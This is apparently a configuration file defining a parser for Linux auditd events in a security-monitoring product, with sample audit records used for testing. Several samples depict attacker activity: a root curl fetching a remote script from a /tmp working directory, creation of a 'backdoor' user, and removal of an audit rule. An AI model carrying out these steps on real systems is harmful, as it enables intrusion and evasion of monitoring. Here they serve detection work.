id: linux-audit
title: Linux Audit – auditd (polecenia, logowania, konta, pliki)
description: |
  Zdarzenia Linux Audit (auditd) z agenta Linux (rekordy jednego zdarzenia
  zgrupowane, źródło file:auditd).
  Parser audit: uruchomione programy z argumentami (EXECVE), logowania
  i uwierzytelnienia (USER_LOGIN, USER_AUTH), sudo (USER_CMD), zmiany kont
  i grup, zmiany konfiguracji audytu, odmowy SELinux/AppArmor oraz zdarzenia
  reguł audytu z kluczem (-k) – pole key. Konto: user (konto logowania –
  AUID), target_user (konto zmieniane). Zalecane reguły audytu:
  vardr-agent audit-rules (docs/agent.md).
version: 1
priority: 90
dataset: linux.audit
match:
  app: [file:auditd]
parser:
  type: audit
fields:
  host.name: node
  user.name: user
  source.ip: src_ip
  process.name: comm
  process.command_line: cmdline
  message: message
  event.action: action
  event.outcome: outcome
time:
  fields: [audit.ms]
  layout: unix_ms
samples:
  - "node=web01 type=SYSCALL msg=audit(1793268000.123:4567): arch=c000003e syscall=59 success=yes exit=0 a0=55d0 a1=55d1 a2=55d2 a3=0 items=2 ppid=1200 pid=1234 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=3 comm=\"curl\" exe=\"/usr/bin/curl\" subj=unconfined key=\"vardr_exec\"\x1dARCH=x86_64 SYSCALL=execve AUID=\"jan\" UID=\"root\" GID=\"root\" EUID=\"root\"\nnode=web01 type=EXECVE msg=audit(1793268000.123:4567): argc=3 a0=\"curl\" a1=\"-s\" a2=\"http://203.0.113.5/x.sh\"\nnode=web01 type=CWD msg=audit(1793268000.123:4567): cwd=\"/tmp\"\nnode=web01 type=PATH msg=audit(1793268000.123:4567): item=0 name=\"/usr/bin/curl\" inode=1 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0\nnode=web01 type=PROCTITLE msg=audit(1793268000.123:4567): proctitle=6375726C002D73\nnode=web01 type=EOE msg=audit(1793268000.123:4567): "
  - "node=web01 type=USER_LOGIN msg=audit(1793268010.500:4570): pid=2001 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=login acct=\"root\" exe=\"/usr/sbin/sshd\" hostname=? addr=203.0.113.9 terminal=ssh res=failed'\x1dUID=\"root\" AUID=\"unset\""
  - "node=web01 type=ADD_USER msg=audit(1793268020.000:4580): pid=2100 uid=0 auid=1000 ses=3 subj=unconfined msg='op=adding user id=1002 exe=\"/usr/sbin/useradd\" hostname=web01 addr=? terminal=pts/0 res=success'\x1dUID=\"root\" AUID=\"jan\" ID=\"backdoor\""
  - "node=web01 type=CONFIG_CHANGE msg=audit(1793268030.000:4590): auid=1000 ses=3 subj=unconfined op=remove_rule key=\"vardr_identity\" list=4 res=1\x1dAUID=\"jan\""
